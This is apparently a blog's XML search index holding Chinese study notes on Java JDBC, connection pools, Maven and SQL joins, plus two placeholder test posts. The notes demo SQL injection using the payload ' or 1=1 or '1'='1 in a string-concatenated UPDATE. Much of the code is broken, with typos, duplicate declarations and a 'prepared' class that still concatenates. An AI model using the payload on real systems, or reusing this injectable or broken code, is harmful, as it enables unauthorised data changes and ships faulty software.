test; Statement stmt = conn.createStatement();//创建一个语句对象 StringBuffer sql = new StringBuffer(); sql.append(&quot; &quot;);//后面多一个空格以免不必要的麻烦 sql.append(&quot; &quot;); stmt.execute(sql.toString()); for(int i = 0 ; i &lt; 10 ; i ++){ StringBuffer sql = new StringBuffer(); sql.append(&quot;&quot;); sql.append(&quot;&quot;+i+&quot;&quot;); stmt.addBatch(sql.toString());//加入批处理 } int[] res = stmt.executeBatch(); StringBuffer sql = new StringBuffer(); sql.append(&quot;&quot;); ResultSet rs = stmt.executeQuery(sql.toString()); while(rs.next()){ int id = rs.getInt(&quot;id&quot;); } sql.append(&quot;insert into employee (id,name,salary) &quot;); sql.append(&quot;values (?,?,?); &quot;); PrepardStatement stmt = conn.prepareStatement(sql.toString()); //为了防止sql注入而开的接口，预编译语句对象，服务端编译一部分，客户端编译一部分 stmt.setInt(1,10); stmt.setString(2,&quot;小红&quot;); stmt.setDouble(3,9.0); stmt.executeUpdate(); stmt.close(); conn.close(); } main(){ try{ test(); }catch(Exception e){ } } //演示SQL注入 public interface LoginAuth{ boolean login(String username,String password); int modifyPassword(String newPwd,String username); } public class LoginAuthTest{ private static LoginAuth la; public static void testPrepared(){ la = new LoginAuthPreparedImpl(); } public static void testStmt(){ la = new LoginAuthStmtImpl(); } main(){ testStmt(); //testPrepared();//安全实现 String username = &quot;lhl&quot;; String password = &quot;123&quot;; boolean flag = la.login(username,password); if(flag){ sout(&quot;登陆成功!&quot;); } } } public class LoginAuthStmtImpl{ public boolean login(){ } public int modify(){ String username = &quot;&apos; or 1=1 or &apos;1&apos;=&apos;1&quot;; sql.append(&quot;update user_info &quot;); sql.append(&quot;set password = &apos;&quot; + newPwd + &quot;&apos; &quot;); sql.append(&quot;where username = &apos;&quot; + username +&quot;&apos;&quot;)； //把where变为true //&apos; or 1=1 or &apos;1&apos;=&apos;1 stmt.extcuteUpdate(sql.toString()); } } public class LoginAuthPrepareImpl{ public int modify(){ String username = &quot;&apos; or 1=1 or &apos;1&apos;=&apos;1&quot;; sql.append(&quot;update user_info &quot;); sql.append(&quot;set password = &apos;&quot; + newPwd + &quot;&apos; &quot;); sql.append(&quot;where username = &apos;&quot; + username +&quot;&apos;&quot;)； //把where变为true //&apos; or 1=1 or &apos;1&apos;=&apos;1 stmt.extcuteUpdate(); } } //基本都是在修改上做注入 Properties 文件的解析 涉及到的类是java.util.Properties 常用方法有 void load(Reader reader) String getProperty(String key) String getProperty(String key,String defaultValue) Properties prp = new Properties(); String src = &quot;xxx&quot; + File.separator + &quot;jdbc.properties&quot;; prp.load(new InputStreamReader(new FileInputStream(src),&quot;utf-8&quot;)); String className = prp.getProperty(&quot;className&quot;); 连接池： //数据库连接用完之后进入池子里，而不需要再次创建 DBCP连接池 的操作框架是MyBatis lib commons-dbcp2-2.2.0.jar commons-logging-1.2.jar commons-pool2-2.5.0.jar public static void testDBCP() throws Exception{ //DataBase Connection Pool //导入jar包 //创建连接池对象 BasicDataSource bds = new BasicDataSource(); //加载并配置连接信息className,url,user,password Properties p = new Properties(); p.load(new FileReader(&quot;xxx/xxx/jdbc.properties&quot;)) bds.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;); //bds.setUrl(&quot;jdbc:mysql://192.168.56.101:3306/lhl_test&quot;); bds.setUrl(p.getProperty(&quot;url&quot;)); bds.setUsername(&quot;root&quot;); bds.setPassword(&quot;root&quot;); Connection conn = bds.getConnection();//连接池会把toString重写 sout(conn); conn.close(); } //连接池单例化 public class Singleton{ private BasicDataSource bds; private static Singleton st; private Singleton(){ bds = new new BasicDataSource(); //加载并配置连接信息className,url,user,password Properties p = new Properties(); p.load(new FileReader(&quot;xxx/xxx/jdbc.properties&quot;)) bds.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;); //bds.setUrl(&quot;jdbc:mysql://192.168.56.101:3306/lhl_test&quot;); bds.setUrl(p.getProperty(&quot;url&quot;)); bds.setUsername(&quot;root&quot;); bds.setPassword(&quot;root&quot;); } //如果调一次锁一次是很耗性能的，所以不加在方法上，加在方法里面 public static Singleton getInstance(){ if(st == null){ synchronized (Singleton.class){ if(st == null){ st = new Singleton(); } } } return st; } public BasicDataSource getDbs(){ return dbs; } } //Singleton只会new一次，因此两者连接起来就是放在Singleton方法中 项目自动化构建 make(Makefile) 通常用于UNIX/Linux上软件的安装。自动化只局限于打包发布安装的阶段。依赖于OS平台命令，用于生成Makefile的configure文件依然需要开发者手动编写，耗时间。 Ant(build.xml) 可以认为是java版本的make。基于Java开发，只要安装了JDK/JRE就能使用，跨平台，编写build.xml的工作量相对较少，自动化也只是局限于打包发布阶段。 Maven(pom.xml)和Ant一样基于java开发，但是功能强大，修改pom.xml可以自动化支持软件生命周期的几乎所有过程（编译，测试，打包发布，安装） jar包依赖管理 apache-maven可以放到和jdk同一目录下 环境变量：MAVEN_HOME ,win10的改成M2_HOME , path mvn 查看 Maven配置： 只需要改仓库位置即可 如果不改的话，会放在 ~/.m2/repository这个目录下，所以要修改 &lt;settings xmlns= //根标签settings xmlns:xsi= xsi:schemaLacation= //这个是其遵循的约束的位置 &gt; //xmlns就是xml的规范文件位置 &lt;localRepository&gt;D:\\workspace\\maven\\repository&lt;/localRepository&gt; 将settings.xml 复制到.m2下 Preferences-&gt;Maven -&gt;User Settings-&gt;Global path (这个要与安装目录下的settings保持一致) User path (与根目录下settings保持一致) -&gt;Installations-&gt;Add-&gt;Directory..-&gt;path: 安装目录到文件夹就行 勾选这个文件夹 clean 是把bin下的文件都删掉，可以勾选clean完再构建这个选项 source folder 与 folder 区别：在构建时source文件夹里的文件会编译成class文件并输出到target文件夹里 new-&gt;maven.project-&gt;group 组名 ；artifact 项目名 &lt;build&gt; maven-compiler-plugin 2.3.2 &lt;/build&gt; String src = &quot;jdbc.properties&quot;; p.load(new InputStreamReader(JDBCUtil.class.getClassLoader().getResourceAsStream(src),&quot;utf-8&quot;)); 仓库存放位置会以groupId/artifactId/version/来存储 maven资源查找顺序-&gt;私服-&gt;中央仓库-&gt;到其他公共仓库找 阿里云公开的自己的私服maven仓库 &lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt; &lt;!-- 建议把测试代码与程序主代码分离 测试代码通通都迁移到src/test下面 这个目录下的代码不是使用Main方法机制运行的 所以要添加Junit组件 src/test中的内容最终是不会被打包发布的 --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;!-- 保证Maven最终打包发布的时候不会把这种jar包打到最终包里面,即junit这个jar包仅是测试用的不会打到最终包里 --&gt; &lt;/dependency&gt; @Test public void test1(){ } pom.xml-&gt;maven build... -&gt;Goals:clean test -&gt;Run 这样所有的测试方法就会自动跑一遍 mvn clean test &lt;!-- 如果是在cmd看输出结果的话，下面这个配置就不能加了，否则会乱码 --&gt; &lt;properties&gt; &lt;argLine&gt;-Dfile.encoding=UTF-8&lt;/argLine&gt; &lt;/properties&gt; Maven命令 mvn clean mvn clean compile mvn clean test mvn clean package mvn clean install mvn clean test /surefire /surefire-reports maven测试生成的文件夹 mvn clean mvn clean compile Maven打包提供给普通的项目用 mvn clean package Maven打包提供给Maven Project使用 1.本地跨Maven项目使用 不需要修改pom.xml mvn clean install 2.跨机器给别人的Maven Project使用 Maven 打包-把jar包当作独立程序直接运行 &lt;build&gt; &lt;plugin&gt; org.apache.maven.plugins maven-compiler-plugin &lt;/plugin&gt; &lt;plugin&gt; org.apache.maven.plugins maven-assembly-plugin &lt;configuration&gt; &lt;descripttorRefs&gt; &lt;descripttorRef&gt;jar-with-dependecies&lt;/descripttorRef&gt; &lt;/descripttorRefs&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;xx.x.x.x&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/build&gt; ------------------------------------------------------------ ------------------------------------------------------------ 多表查询 给product中的这个cno添加一个外键约束 alter table product add foreign key(cno) references category(cid) 一对多：商品和分类 原则：在多的一方添加一个外键，指向一方的主键 多对多的建表： 多建一张中间表，将多对多的关系拆成一对多关系，中间表至少要有两个外键，这两个外键分别指向原来的那张表 一对一建表： 原则： 将一对一的情况，当作是一对多情况处理，在任意一张表添加一个外键，并且这个外键要唯一，指向另外一张表 直接将两张表合并成一张表 将两张表的主键建立起连接，让两张表里面主键相等 用途： 个人信息，拆表 SQLyog工具 sn.txt有注册码 内连接 --隐式内连接 select * from product p,category c where p.cno=c.cid; --显示内连接 select * from product p inner join category c on p.cno=c.cid --区别： 隐式内连接：在查询出结果的基础上去做的where条件过滤 显示内连接：带着条件去查询结果，执行效率要高 左外连接 左表：product select * from product p left outer join category c on p.cno=c.cid;]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>数据库</category>
        <category>MySQL</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[third]]></title>
    <url>%2F2018%2F09%2F06%2Fthird%2F</url>
    <content type="text"><![CDATA[这里需要点击全部显示才能显示!测试专用，没必要看 hello this is the third title;666666666666666666666666666666666666666666666666666666666666666 123]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[second_article]]></title>
    <url>%2F2018%2F09%2F01%2Fsecond-article%2F</url>
    <content type="text"><![CDATA[这里是测试专用，没必要看 这里需要点击全部显示才能显示! hello this is the second title;123456 我可以设置这一句的颜色哈哈 我还可以设置这一句的大小嘻嘻 我甚至可以设置这一句的颜色和大小呵呵 这一行需要居中 123]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
